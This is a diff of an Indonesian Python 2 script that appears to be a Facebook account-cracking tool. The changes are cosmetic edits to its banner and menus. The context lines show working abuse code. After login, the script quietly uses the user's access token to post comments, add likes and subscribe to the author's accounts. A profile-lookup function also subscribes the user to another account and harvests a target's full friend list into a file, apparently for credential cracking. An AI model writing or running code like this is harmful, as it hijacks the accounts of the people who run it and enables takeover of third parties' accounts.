@@ -23,14 +23,14 @@ Dan Jika Ingin Di Ganti Izin Dulu :v
 
 #####################################
 logo = ("""\x1b[1;92m    __  ___ ______  __☆☆☆☆☆☆☆☆☆☆___ ______ ® 
-\x1b[1;92m   /  \/   /__    )/  /__ _____/   /__    ) 
+\x1b[1;92m   /  \/   /__    )/  /___ ____/   /__    ) 
 \x1b[1;92m  /       /___)   /  __  )  ___   /___)   / 
 \x1b[1;96m /  /\/  /  __   /  / /  / (__/  /  __   / 
 \x1b[1;96m/__/ /__/(______/__/ /__/(______/(______/ V2.0.1
 \x1b[1;95m=================================================
 \x1b[1;96m╔══◍➤Desigen By : Raka Andrian Tara
-\x1b[1;96m╠══◍➤Github : https://github.com/Garangan-Z
-\x1b[1;96m╚══◍➤Instagram : raka_andrian27
+\x1b[1;96m╠══◍➤Github     : https://github.com/Garangan-Z
+\x1b[1;96m╚══◍➤Instagram  : raka_andrian27
 \x1b[1;95m=================================================""")
 url=('http://ipinfo.io/json')
 response=urlopen(url)
@@ -45,15 +45,15 @@ mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insec
 def login():
 	os.system('clear')
 	print(logo)
-	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Token")
-	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Mendapat Token")
-	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
-	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
+	print("\x1b[1;92m╔══◍➤[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Token")
+	print("\x1b[1;92m╠══◍➤[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Mendapat Token")
+	print("\x1b[1;92m╚══◍➤[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
+	login = raw_input("\n\x1b[1;92m╠══◍➤[\x1b[1;97m•\x1b[1;92m] Choose :\x1b[1;96m ")
 	if login == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
+		exit("\x1b[1;93m╚══◍➤[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
 	elif login == "1":
                 try:
-			token=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Token :\x1b[1;92m ")
+			token=raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Token :\x1b[1;92m ")
                         cek=requests.get('https://graph.facebook.com/me?access_token='+token)
                         y=json.loads(cek.text)
                         nama = y['name']
@@ -64,8 +64,8 @@ def login():
                 except KeyError:
                         exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah")
 	elif login == "2":
-		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
-		time.sleep(3)
+		print("\x1b[1;96m[\x1b╚══◍➤[1;97m•\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
+		time.sleep(2)
 		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
 		exit()
 	elif login == "0":
@@ -101,31 +101,31 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
 	requests.post('https://graph.facebook.com/3889223774448718/comments/?message='+komen2+'&access_token='+token)
         requests.post('https://graph.facebook.com/3889223774448718/likes?summary=true&access_token=' +toket)
-        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' + toket)
-        requests.post('https://graph.facebook.com/953529338576547/comments/?message=Mantap Bang ❤️&access_token=' + toket)
-        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' +toket)
+        requests.post('https://graph.facebook.com/953529338576547/comments/?message=Mantap Bang ❤️&access_token=' +toket)
+        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' +toket)
         requests.post('https://graph.facebook.com/3882176535153442/likes?summary=true&access_token=' +toket)
-	requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' +toket)
 	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
 	menu()
 def publik():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
+                print('\x1b[1;93m╠══◍➤[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
+                idt = raw_input("\x1b[1;96m╚══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
+                file = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                         req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                         op = json.loads(req.text)
-                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
+                        print("\x1b[1;96m╚══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                 except KeyError:
-                        print('\x1b[1;91m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
-                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+                        print('\x1b[1;91m╠══◍➤[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
+                        raw_input("\x1b[1;97m╚══◍➤[\x1b[1;92mKembali\x1b[1;97m]")
                         menu()
                 r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                 id = []
